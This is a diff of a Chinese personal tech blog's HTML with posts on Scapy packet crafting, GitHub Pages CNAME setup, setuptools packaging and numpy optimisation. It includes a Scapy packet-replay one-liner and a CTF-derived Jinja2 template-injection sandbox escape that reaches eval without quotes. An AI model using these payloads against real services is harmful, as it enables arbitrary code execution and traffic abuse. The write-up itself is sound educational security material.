@@ -58,11 +58,9 @@
   </header>
   <div>
       <h3>构造包以及一些网络基础知识</h3>
-<p>载入所有函数<br>
-</p>
+<p>载入所有函数  </p>
 <div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
 </pre></div>
-
 
 <p>或者从命令行输入<code>sudo scapy</code></p>
 <p>scapy 可以控制各个层的数据， 使用<code>/</code>符号拼合各个层构造出一个包</p>
@@ -73,10 +71,8 @@
 <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">packet</span><span class="p">))</span>
 </pre></div>
 
-
 <p>IP层控制 ip 地址， 对于 udp 包来说不需要握手可以伪造源地址。UDP 是和 TCP 平行的一层， 控制发包的源端口和目标端口。<br>
-再后面一层是要发送的数据。<br>
-</p>
+再后面一层是要发送的数据。  </p>
 <p><code>packet.show()</code> 工整的打印包数据</p>
 <h3>发送包</h3>
 <p>scapy 有几种发包的方式。<br>
@@ -87,21 +83,15 @@ packet = Ether(src=RandMAC())/IP(dst=&#39;192.168.31.1&#39;)/UDP(dport=33331)/b&
 sendp(packet)
 </pre></div>
 
-
 <p><code>sendp</code>可以指定发送的 iface。同时可以构造包的时候加入构造<code>Ether()</code></p>
 <h3>UDP广播</h3>
 <p>子网内的机器在接受数据时是这样一个流程。<br>
-当数据包从网卡流过的时候， 网卡检查数据包的目标 mac 地址是否包含于自己等待的地址中（既网卡可以监听多个 mac 地址）， 符合就吧数据包拷贝一份向上层传输， 之后检查目标 IP 是否和自己监听的 ip 地址之一符合， 如果符合再交由上层处理， 如果不符合， 则看自己是否配置了路由功能， 然后根据路由表选择出口， 如果没有就从默认路由出去。<br>
-</p>
-<p>之所以有 ip 和 mac 之分， 是因为 mac 地址的表示是48位的， 而网络协议的 ip 是32位的。<br>
-</p>
+当数据包从网卡流过的时候， 网卡检查数据包的目标 mac 地址是否包含于自己等待的地址中（既网卡可以监听多个 mac 地址）， 符合就吧数据包拷贝一份向上层传输， 之后检查目标 IP 是否和自己监听的 ip 地址之一符合， 如果符合再交由上层处理， 如果不符合， 则看自己是否配置了路由功能， 然后根据路由表选择出口， 如果没有就从默认路由出去。  </p>
+<p>之所以有 ip 和 mac 之分， 是因为 mac 地址的表示是48位的， 而网络协议的 ip 是32位的。  </p>
 <p>所以在进行广播的时候， 把目标 mac 地址设置为<code>ff:ff:ff:ff:ff:ff</code>, 对于绝大部分机器网卡都会接受这个地址。</p>
-<p>一种是受限广播， 目标 ip 设置为<code>255.255.255.255</code>， mac 地址设置为<code>ff:ff:ff:ff:ff:ff</code>， 这种方式路由器不对目的 ip 为<code>255.255.255.255</code> 进行转发，改数据报只在该子网中出现。<br>
-</p>
-<p>另一种是指向子网的广播， <code>xxx.xxx.xxx.255</code>， 数据包会被转发到该子网内广播。<br>
-</p>
-<p>在 scapy 中， 可以直接把地址设置为<code>255.255.255.255</code>来广播， 但是会得到<br>
-</p>
+<p>一种是受限广播， 目标 ip 设置为<code>255.255.255.255</code>， mac 地址设置为<code>ff:ff:ff:ff:ff:ff</code>， 这种方式路由器不对目的 ip 为<code>255.255.255.255</code> 进行转发，改数据报只在该子网中出现。  </p>
+<p>另一种是指向子网的广播， <code>xxx.xxx.xxx.255</code>， 数据包会被转发到该子网内广播。  </p>
+<p>在 scapy 中， 可以直接把地址设置为<code>255.255.255.255</code>来广播， 但是会得到  </p>
 <p><code>WARNING: Mac address to reach destination not found. Using broadcast.</code></p>
 <p>这是因为使用 <code>send</code> 函数的缘故， 这个函数作用于 layer3 ， 自动组装了 layer2 层的东西， 目的 mac 地址这个时候就会在 arp 表中查询， 然而广播地址的 mac 地址是查不到的， 这个时候它就会提示程序自动把目的地址mac设置成了广播用的 mac</p>
 <h4>solution</h4>
@@ -110,25 +100,19 @@ sendp(packet)
 sendp(packet)
 </pre></div>
 
-
 <p>值得注意的是， <code>sendp</code>是可以使用指定的 interface 来发送包，默认情况下使用<code>conf.iface</code>的设备</p>
 <h3>重放攻击</h3>
-<p><code>sniff</code>用于监听网络流量， sniff 是阻塞的，可以使用回调函数来处理每一个捕获到的包。  同时可以使用 filter 参数过滤要捕获的包，也可以指定用于监听的 interface， 默认使用所有设备来监听<br>
-</p>
+<p><code>sniff</code>用于监听网络流量， sniff 是阻塞的，可以使用回调函数来处理每一个捕获到的包。  同时可以使用 filter 参数过滤要捕获的包，也可以指定用于监听的 interface， 默认使用所有设备来监听  </p>
 <p>filter 的语法和 tcpdump 中用于过滤的语法一样， 可以使用<code>man pcap-filter</code>查看详细的内容。</p>
 <div class="highlight"><pre><span></span>sniff(filter=&#39;udp dst port 2333&#39;, prn=lamda pkt: pkt.show())
 </pre></div>
 
-
-<p>这段代码循环监听 目标端口为2333的 udp 包， 然后回调程序吧这个包展示出来。<br>
-</p>
+<p>这段代码循环监听 目标端口为2333的 udp 包， 然后回调程序吧这个包展示出来。  </p>
 <p>之后可以吧收到的包再发出去， 完成一次重放（UDP）</p>
 <div class="highlight"><pre><span></span>sniff(prn=lambda pkt:sendp(pkt))
 </pre></div>
 
-
-<p>如果是 tcp 的重放，需要修改 ack。<br>
-</p>
+<p>如果是 tcp 的重放，需要修改 ack。  </p>
   </div>
   <hr />
 </article>
@@ -145,14 +129,12 @@ sendp(packet)
 <div class="highlight"><pre><span></span>xxx.github.io --&gt; blog.xxx.com
 </pre></div>
 
-
 <ul>
 <li>
 <p>首先在 github page 上面的项目里添加一个文件<code>CNAME</code>, 内容是目标站点<code>blog.xxx.com</code></p>
 </li>
 <li>
-<p>之后， 在 DNS advance 上面增加一条CNAME记录， 如果要使用<code>blog.xxx.com</code>那么 <code>host</code> 的值填 <code>blog</code>而不是<code>blog.xxx.com</code>， value 填<code>xxx.github.io</code><br>
-</p>
+<p>之后， 在 DNS advance 上面增加一条CNAME记录， 如果要使用<code>blog.xxx.com</code>那么 <code>host</code> 的值填 <code>blog</code>而不是<code>blog.xxx.com</code>， value 填<code>xxx.github.io</code>  </p>
 </li>
 <li>
 <p>如果你的 github page 是一个不断更新的博客， 必须在渲染时增加 CNAME 记录。  我是用的是 pelican， 设置方法是在<code>pelicanconf.py</code> 中设置</p>
@@ -166,12 +148,10 @@ sendp(packet)
                 <span class="s1">&#39;static&#39;</span><span class="p">]</span>
 </pre></div>
 
-
 <p>之后就是等待 dns 的刷新了</p>
 <h3>小结</h3>
 <p>CNAME 设置是 <code>blog</code>， 而不<code>blog.xxx.com</code>, 不然域名会解析到<code>blog.xxx.com.xxx.com</code></p>
-<p>另外， pelican 默认只听是 googleapi 上面的， 虽然据说可能大概好像也许， 在北京有服务器， 但是我这里还是很慢， 于是我把字体的 url 改成了中科大的。<br>
-</p>
+<p>另外， pelican 默认只听是 googleapi 上面的， 虽然据说可能大概好像也许， 在北京有服务器， 但是我这里还是很慢， 于是我把字体的 url 改成了中科大的。  </p>
 <p>方法：
 在主题里的 templates 目录的<code>base.html</code>中</p>
 <div class="highlight"><pre><span></span><span class="c">&lt;!--&lt;link href=&#39;//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic&#39; rel=&#39;stylesheet&#39; type=&#39;text/css&#39;&gt;--&gt;</span>
@@ -190,7 +170,7 @@ sendp(packet)
   </header>
   <div>
       <h3>intro</h3>
-<p>不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~</p>
+<p>不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。<del>（当然最后是用其他的方法</del></p>
 <p>后来想了一下绕过引号的方法。</p>
 <p>首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是<code>__buildtins__</code>, 然后找出 <code>eval</code>进行任意代码执行， 绕过沙盒的限制</p>
 <div class="highlight"><pre><span></span><span class="ch">#! python3</span>
@@ -201,14 +181,12 @@ sendp(packet)
 <span class="c1">#output &quot;&lt;class &#39;list&#39;&gt;&quot;</span>
 </pre></div>
 
-
 <p>我们可以通过这种方法调用自带的函数或者对象， 通过<code>subclasses</code> 找到更加多的类</p>
 <div class="highlight"><pre><span></span><span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span>
 
 <span class="k">print</span><span class="p">([]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">0</span><span class="p">])</span>
 <span class="c1">#output type</span>
 </pre></div>
-
 
 <p>之后利用其中的 <code>catch_warnings</code> 访问 globals 定位出 <code>eval</code>， 然后进行任意代码执行。</p>
 <div class="highlight"><pre><span></span><span class="c1">#python3 </span>
@@ -220,7 +198,6 @@ sendp(packet)
      <span class="o">...</span><span class="p">:</span> <span class="n">lobals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&quot;1+1&quot;</span><span class="p">)}}</span><span class="s1">&#39;).render()</span>
 <span class="n">Out</span><span class="p">[</span><span class="mi">153</span><span class="p">]:</span> <span class="s1">&#39;2&#39;</span>
 </pre></div>
-
 
 <h3>绕过引号</h3>
 <p>一般情况下， <code>%</code>会被过滤， 但是如果引号也被过滤的话怎么构造出 eval 可以执行的字符串呢？</p>
@@ -235,7 +212,6 @@ sendp(packet)
 <span class="n">In</span> <span class="p">[</span><span class="mi">157</span><span class="p">]:</span> <span class="nb">eval</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="mi">49</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">49</span><span class="p">]))</span>
 <span class="n">Out</span><span class="p">[</span><span class="mi">157</span><span class="p">]:</span> <span class="mi">2</span>
 </pre></div>
-
 
 <h4>python3</h4>
 <p>利用：</p>
@@ -253,14 +229,12 @@ sendp(packet)
 <span class="c1">#output &#39;3.6.1 (default, Mar 23 2017, 16:49:06) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)]&#39;</span>
 </pre></div>
 
-
 <h4>python2</h4>
 <p>python2 的<code>catch_warnings</code>在<code>[59]</code>的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用<code>__str__</code>方法来转化成字符串。其余和 python3相同。</p>
 <div class="highlight"><pre><span></span><span class="n">Template</span><span class="p">(</span><span class="s1">&#39;{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
 
 <span class="c1">#output u&#39;2.7.10 (default, Feb  6 2017, 23:53:20) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]&#39;</span>
 </pre></div>
-
 
 <hr>
 <p>2017-05-01 20:33:47</p>
@@ -280,14 +254,11 @@ sendp(packet)
 <div class="highlight"><pre><span></span>python3 setup.py sdist bdist_wheel
 </pre></div>
 
-
 <p>使用pip安装的时候一般是安装bdist打包出来的文件。</p>
-<p>关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了<code>package_data</code>参数， 另外对于 setuptools 还提供了特别的 <code>include_package_data</code>的参数， 接下来介绍这些参数的意义和怎么用。<br>
-</p>
+<p>关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了<code>package_data</code>参数， 另外对于 setuptools 还提供了特别的 <code>include_package_data</code>的参数， 接下来介绍这些参数的意义和怎么用。  </p>
 <h2>MANIFEST.in</h2>
 <p>MANIFEST.in文件是针对 源文件打包 的， 当需要把非程序文件， 包括README， css或者test文件等加入时， 在MANIFEST.in中指定， 用于生成MANIFEST</p>
-<p>MIANIFEST会暗中自动寻找以下的文件：<br>
-</p>
+<p>MIANIFEST会暗中自动寻找以下的文件：  </p>
 <ul>
 <li>所有<code>py_modules</code> 和 <code>packages</code>中没有明确说明的python文件 </li>
 <li>ext_modules 或 libraries选项中指明的C文件</li>
@@ -299,10 +270,8 @@ sendp(packet)
 </ul>
 <h2>package_data</h2>
 <p><code>package_data</code>是在setup.py中的参数， 用于控制安装包里面包含的文件。<br>
-应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。<br>
-</p>
-<p>一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。<br>
-</p>
+应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。  </p>
+<p>一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。  </p>
 <h2>include_package_data</h2>
 <p>坑就是指<code>include_package_data</code>， 这个参数是setuptools特有的， 但是非常容易让人误解然后勿用。 setuptools的文档中是这样写的</p>
 <blockquote>
@@ -312,19 +281,14 @@ sendp(packet)
 <p>原本是 MANIFEST 在 setup.py 中的<code>package_data</code>寻找额外的文件的， 现在变成大家以 MANIFEST.in 为准了。</p>
 <p>这会发生什么事情呢， 
 如果你同时用了<code>include_package_data</code>和<code>package_data</code>， 那么你的 sdist 就会瞬间爆炸。<br>
-bdist 打包出来的东西会包含<code>package_data</code>中的内容， 但是源代码打包的时候就会失去在<code>package_data</code>中指明的文件。<br>
-</p>
+bdist 打包出来的东西会包含<code>package_data</code>中的内容， 但是源代码打包的时候就会失去在<code>package_data</code>中指明的文件。  </p>
 <h2>总结</h2>
-<p><strong>永远也不要用<code>include_package_data</code></strong><br>
-</p>
-<p><code>MANIFEST.in</code> 用来给源文件打包， 里面包含许多额外的信息， 比如测试文件之类的。<br>
-</p>
-<p><code>package_data</code>用于指定安装时加入的额外的文件， 不需要再MANIFEST.in中重复定义， 源文件打包的时候回自动包含这里面的文件。<br>
-</p>
+<p><strong>永远也不要用<code>include_package_data</code></strong>  </p>
+<p><code>MANIFEST.in</code> 用来给源文件打包， 里面包含许多额外的信息， 比如测试文件之类的。  </p>
+<p><code>package_data</code>用于指定安装时加入的额外的文件， 不需要再MANIFEST.in中重复定义， 源文件打包的时候回自动包含这里面的文件。  </p>
 <p>参考:</p>
 <ul>
-<li><a href="https://docs.python.org/3.4/distutils/sourcedist.html#specifying-the-files-to-distribute">specifying-the-files-to-distribute</a><br>
-</li>
+<li><a href="https://docs.python.org/3.4/distutils/sourcedist.html#specifying-the-files-to-distribute">specifying-the-files-to-distribute</a>  </li>
 <li><a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#including-data-files">setuptools</a></li>
 </ul>
 <p>2016年12月12日01:04:25</p>
@@ -340,19 +304,17 @@ bdist 打包出来的东西会包含<code>package_data</code>中的内容， 但
       <a href="http://littlezz.github.io/tag/python.html">python</a>,      <a href="http://littlezz.github.io/tag/numpy.html">numpy</a>    </p>
   </header>
   <div>
-      <p>本文主要总结了如何把numpy计算速度优化100倍的过程。<br>
-</p>
+      <p>本文主要总结了如何把numpy计算速度优化100倍的过程。  </p>
 <h2>简介</h2>
 <p>最近要对图片做二值化， 参照<a href="http://people.scs.carleton.ca/~roth/iit-publications-iti/docs/gerh-50002.pdf">Adaptive Thresholding Using the Integral Image</a> 这篇论文， 可是Python的for循环非常的慢，单纯的翻译伪代码实现起来速度要比C慢接近100倍， 论文上的实现对640x480的图片用时大概为15ms， 接下来我们要一步步从最初的慢100倍优化到和C一样快， 以及最后再比它快一点点。</p>
 <h2>算法</h2>
 <p>首先， 介绍一下 Adaptive Thresholding Using the Integral Image 这篇论文， 论文很简单， 对一个点周围的一片区域取平均值， 如果该点低于平均值的85%， 就设为黑， 否则为白色。 论文主要是用累积和来改进取一片区域平均值的速度。 
 过程为水平方向做一次累积和， 垂直方向做一次累积和， 这样每一个点就表示其左上角的区域的和， 于是要计算一个矩形（a, b, c, d), 其区域上的和就是 d - b -c + a. 
-原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。<br>
-</p>
+原始的扫描区域的每一个点求和， 时间是O(n * n * boxsize * boxsize)， 现在变成了常数时间。  </p>
 <h2>直观实现</h2>
 <p>首先我们直接照着原理实现，理论是最快的
 （然而实际是最慢的） </p>
-<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">intuitive_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
+<p><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">intuitive_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
     <span class="n">mat</span> <span class="o">=</span> <span class="n">mat</span><span class="o">.</span><span class="n">T</span>
     <span class="n">integral_map</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
     <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
@@ -381,20 +343,15 @@ bdist 打包出来的东西会包含<code>package_data</code>中的内容， 但
 
     <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span><span class="o">.</span><span class="n">T</span>
 </pre></div>
-
-
-<p>mat是我们的图片矩阵， boxsize是区域的长度， 必须是奇数。 
+mat是我们的图片矩阵， boxsize是区域的长度， 必须是奇数。 
 每个点都在周围取一个boxsize长度的矩形， 要特别处理边界， 让他不要超出累积矩阵。<br>
-很直观的代码， 纯翻译自论文里面的伪代码。<br>
-</p>
+很直观的代码， 纯翻译自论文里面的伪代码。  </p>
 <p>看看速度：</p>
-<div class="highlight"><pre><span></span>⇒  python3 implement.py
+<p><div class="highlight"><pre><span></span>⇒  python3 implement.py
 Image shape 640x480
 intuitive_method take 1658.280885 ms  
 </pre></div>
-
-
-<p>1600ms, （怎么和说好的15ms不一样）。</p>
+1600ms, （怎么和说好的15ms不一样）。</p>
 <h2>改进的直观方法</h2>
 <div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">optimized_intuitive_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
     <span class="n">mat</span> <span class="o">=</span> <span class="n">mat</span><span class="o">.</span><span class="n">T</span>
@@ -421,19 +378,15 @@ intuitive_method take 1658.280885 ms
     <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span><span class="o">.</span><span class="n">T</span>
 </pre></div>
 
-
 <p>Numpy提供了item和itemset方法来加速对矩阵上单个点的操作。<br>
 同时两次累积和实际可以用可以用<code>np.cumsum</code>来计算， 但是这里有一个小细节，<br>
 单纯的使用两次<code>a=np.cumsum(...)</code>会额外进行一次内部的内存拷贝， 我们要指定<code>out</code>参数来阻止多余的内存拷贝.</p>
-<p>在计算half_s的时候， 使用移位<code>boxsize &gt;&gt; 1</code>来加速。<br>
-</p>
-<div class="highlight"><pre><span></span>⇒  python3 implement.py
+<p>在计算half_s的时候， 使用移位<code>boxsize &gt;&gt; 1</code>来加速。  </p>
+<p><div class="highlight"><pre><span></span>⇒  python3 implement.py
 Image shape 640x480
 optimized_intuitive_method take 823.928799 ms
 </pre></div>
-
-
-<p>快了一倍， 但是还是不够</p>
+快了一倍， 但是还是不够</p>
 <h2>猥琐法</h2>
 <p>不妨让我们直接退化到累积和的优化之前，纯粹的暴力计算，所有计算都交给opencv， 看看会发生什么事情。</p>
 <div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">opencv_way</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span> <span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
@@ -445,66 +398,50 @@ optimized_intuitive_method take 823.928799 ms
     <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
 </pre></div>
 
-
 <p>这是时间：</p>
 <div class="highlight"><pre><span></span>⇒  python3 implement.py
 Image shape 640x480
 opencv_way take 35.920926 ms
 </pre></div>
 
-
 <p>好了， 可以全剧终了。<br>
 简单的6行代码， 纯粹的暴力美学。 速度快了40倍。（你学到了么？）<br>
 这里我们借助opencv 的 <code>filter2D</code>方法， 自己定义了一个kernel， 用来求一个点周围区域的平均值， 接下来的计算就全部交给opencv了。 <br>
-关于opencv， 有一点需要补充， <strong>opencv表示， numpy是辣鸡， 请多使用opencv自带的函数</strong>。<br>
-</p>
+关于opencv， 有一点需要补充， <strong>opencv表示， numpy是辣鸡， 请多使用opencv自带的函数</strong>。  </p>
 <h2>向量化</h2>
 <p>还不能全剧终， 接下来是重点， numpy是为矩阵计算而生的， 我们前面一直按照C的思维来对单个点做操作， 而且for循环的存在导致速度下降太多， 接下来我们要寻求把for循环替换掉， 改成向量的计算。</p>
 <p>对于numpy来说， 比如我有两个2维矩阵A和B， 要计算两个矩阵上所有点的差， 从速度上来说， </p>
 <div class="highlight"><pre><span></span>A - B &gt; A[i] - B[i] &gt; A[i,j] - B[i,j]
 </pre></div>
 
-
 <p>我们现在希望把所有的for循环， 替换为矩阵的计算 <code>A - B</code></p>
-<p>一开始的时候我想到利用一次for循环， 从上往下计算两行之间的值， 接着从左往右计算每一列的值， 但是这样只能去掉一个for循环， 后来我想了2个晚上， 想通了实际上所有等距离点操作都可以转化为等距离的向量操作， 进而可以通过构造矩阵来进行矩阵间的操作。<br>
-</p>
-<p>对于之前的代码， 计算累积和部分已经很好了， 关键之后的计算， 代码冗余， 效率低下。<br>
-</p>
+<p>一开始的时候我想到利用一次for循环， 从上往下计算两行之间的值， 接着从左往右计算每一列的值， 但是这样只能去掉一个for循环， 后来我想了2个晚上， 想通了实际上所有等距离点操作都可以转化为等距离的向量操作， 进而可以通过构造矩阵来进行矩阵间的操作。  </p>
+<p>对于之前的代码， 计算累积和部分已经很好了， 关键之后的计算， 代码冗余， 效率低下。  </p>
 <p>其中造成整个for循环存在的关键因素是下面这句代码</p>
-<div class="highlight"><pre><span></span>integral_map[x2, y2] - integral_map[x1, y2] - integral_map[x2, y1] + integral_map[x1, y1]
+<p><div class="highlight"><pre><span></span>integral_map[x2, y2] - integral_map[x1, y2] - integral_map[x2, y1] + integral_map[x1, y1]
 </pre></div>
-
-
-<p>而实际上， 这些点之间是等距离的， （boxsize的距离）， 也就是说， 每一个点对应的x1， x2, y1, y2 都是固定的， 我们可以构造出4个矩阵， 分别向左上， 右上， 左下， 右下位移一段距离， 
-这样就可以吧整个for循环计算化简成<br>
-</p>
+而实际上， 这些点之间是等距离的， （boxsize的距离）， 也就是说， 每一个点对应的x1， x2, y1, y2 都是固定的， 我们可以构造出4个矩阵， 分别向左上， 右上， 左下， 右下位移一段距离， 
+这样就可以吧整个for循环计算化简成  </p>
 <div class="highlight"><pre><span></span>D + A - C - B
 </pre></div>
 
-
 <p>那么怎么构造出这些矩阵呢？<br>
-想象一下， 把<code>integral_map[x1, y1]</code>当成一个集合， 记为A， <code>integral_map[x1, y2]</code>的集合记为B， <code>integral_map[x2, y1]</code>的集合记为C，<code>integral_map[x2, y2]</code>记为D。 <br>
-</p>
-<p>以构造A为例， A实际上是对原先的矩阵向上和向左平移了一半的boxsize的距离， 比如对于矩阵右下角的点，A对应于 <code>integral_map[h-half_boxsize, w-half_boxsize]</code><br>
-</p>
-<p>但是对于左上角的点， 超出了累积矩阵的范围， 为了避免额外的对边界的判断， 我们要额外构造出边框。<br>
-</p>
+想象一下， 把<code>integral_map[x1, y1]</code>当成一个集合， 记为A， <code>integral_map[x1, y2]</code>的集合记为B， <code>integral_map[x2, y1]</code>的集合记为C，<code>integral_map[x2, y2]</code>记为D。   </p>
+<p>以构造A为例， A实际上是对原先的矩阵向上和向左平移了一半的boxsize的距离， 比如对于矩阵右下角的点，A对应于 <code>integral_map[h-half_boxsize, w-half_boxsize]</code>  </p>
+<p>但是对于左上角的点， 超出了累积矩阵的范围， 为了避免额外的对边界的判断， 我们要额外构造出边框。  </p>
 <p>想象一下， 比如我们有一个5x5的矩阵， boxsize取3, </p>
-<div class="highlight"><pre><span></span>  0 1 2 3 4
+<p><div class="highlight"><pre><span></span>  0 1 2 3 4
 0 * * * * *
 1 * * * * *
 2 * * * * *
 3 * * * * *
 4 * * * * *
 </pre></div>
-
-
-<p>计算 (2, 2) 的时候， 取 (1, 1), (1, 3)， （3，1）， （3，3）四个点<br>
+计算 (2, 2) 的时候， 取 (1, 1), (1, 3)， （3，1）， （3，3）四个点<br>
 计算(0,0)上的和的时候， 右下角取（1，1）， 左上角超出了边界，所以只能取（0，0）<br>
-计算（0，1）的时候，右下角是（1，2） 但是左上角还是（0，0）  <br>
-</p>
+计算（0，1）的时候，右下角是（1，2） 但是左上角还是（0，0）    </p>
 <p>所以我们可以构造出一个<code>(boxsize-1)/2</code> 长度的边框，边框上的值和边界的值一样。 这样我们可以通过平移得到ABCD四个矩阵， 而不用额外的边界判断。 </p>
-<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">vector_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
+<p><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">vector_method</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">set_value</span><span class="p">,</span> <span class="n">threshold</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
     <span class="n">inv_value</span> <span class="o">=</span> <span class="n">set_value</span> <span class="o">^</span> <span class="mi">255</span>
     <span class="n">integral_map</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros_like</span><span class="p">(</span><span class="n">mat</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
 
@@ -529,10 +466,7 @@ opencv_way take 35.920926 ms
     <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">mat</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">,</span> <span class="p">[</span><span class="n">set_value</span><span class="p">],</span> <span class="p">[</span><span class="n">inv_value</span><span class="p">])</span>
     <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
 </pre></div>
-
-
-<p>但是， 现在还有一道阴影笼罩着我们， 我们没有办法得到窗口的实际大小。 边界附近的点上的窗口是变化的， 我们得额外构造出一个矩阵<code>COUNT</code>来表示每个点上的窗口大小。<br>
-</p>
+但是， 现在还有一道阴影笼罩着我们， 我们没有办法得到窗口的实际大小。 边界附近的点上的窗口是变化的， 我们得额外构造出一个矩阵<code>COUNT</code>来表示每个点上的窗口大小。  </p>
 <div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_count_matrix</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">boxsize</span><span class="p">):</span>
     <span class="sd">&quot;&quot;&quot;</span>
 <span class="sd">    矩阵上每个点的值表示该点上的窗口覆盖的总点数。</span>
@@ -555,20 +489,16 @@ opencv_way take 35.920926 ms
     <span class="k">return</span> <span class="n">A</span> <span class="o">*</span> <span class="n">B</span>
 </pre></div>
 
-
 <p>看一下所需的时间</p>
 <div class="highlight"><pre><span></span>⇒  python3 implement.py
 Image shape 640x480
 vector_method take 22.166661 ms
 </pre></div>
 
-
-<p>现在我们比最初快了80倍， 已经接近论文上的理论速度了， 但是<code>get_count_matrix</code>函数显得非常的力不从心， 还可以寻找优化的办法。<br>
-</p>
+<p>现在我们比最初快了80倍， 已经接近论文上的理论速度了， 但是<code>get_count_matrix</code>函数显得非常的力不从心， 还可以寻找优化的办法。  </p>
 <h2>优化后的向量化方法</h2>
 <p>回想之前的整个过程， 我们对边界的处理实际上过于保守了， 导致计算窗口覆盖点数的时候过于小心翼翼了(不然boxsize-1是怎么得出来的， 都是泪啊)。</p>
